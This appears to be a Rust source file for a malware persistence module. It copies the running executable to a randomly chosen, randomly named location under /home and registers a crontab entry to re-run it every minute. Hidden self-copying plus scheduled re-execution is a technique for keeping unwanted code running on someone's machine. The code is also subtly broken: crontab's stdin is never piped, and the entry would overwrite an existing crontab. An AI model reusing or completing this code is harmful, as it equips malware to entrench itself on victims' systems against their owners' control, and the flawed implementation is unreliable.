use std::process::Command;
use std::path::PathBuf;
use std::io::Write;
use std::env;
use std::fs;

use log::{info, warn};
use rand::seq::SliceRandom;


pub struct Persistance {
    path: PathBuf,
}

impl Persistance {
    pub fn new() -> Persistance {
        let mut path = rand_subpath(PathBuf::from("/home"));

        path.push(format!("lprs_{:x?}", rand::random::<u64>()));

        Persistance {
            path,
        }
    }

    fn duplicate(&self) -> Result<u64, Box<dyn std::error::Error>> {
        let from = env::current_exe()?;

        fs::copy(from, &self.path).map_err(|err| err.into())
    }

    pub fn install(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let mut process = Command::new("/usr/bin/crontab").spawn()?;

        self.duplicate()?;

        match process.stdin.take() {
            Some(mut stdin) => {
                if let Some(path) = self.path.to_str() {
                    stdin.write_all(format!("* * * * * {}", path).as_bytes())?;
                }

                info!("successfully set crontab");
            },
            None => {
                warn!("failed to set crontab");
            },
        }

        Ok(())
    }
}

pub fn rand_subpath(path: PathBuf) -> PathBuf {
    let mut rng = rand::thread_rng();

    match fs::read_dir(&path) {
        Ok(dir) => {
            let subdirs = dir.into_iter()
                .filter_map(|entry| entry.ok().and_then(|entry| entry.path().is_dir().then(|| entry.path())))
                .collect::<Vec<PathBuf>>();

            match subdirs.choose(&mut rng) {
                Some(path) => rand_subpath(path.clone()),
                None => path,
            }
        },
        Err(_) => path,
    }
}

pub fn init() {
    let persistance = Persistance::new();

    info!("path: {:#?}", persistance.path);
}


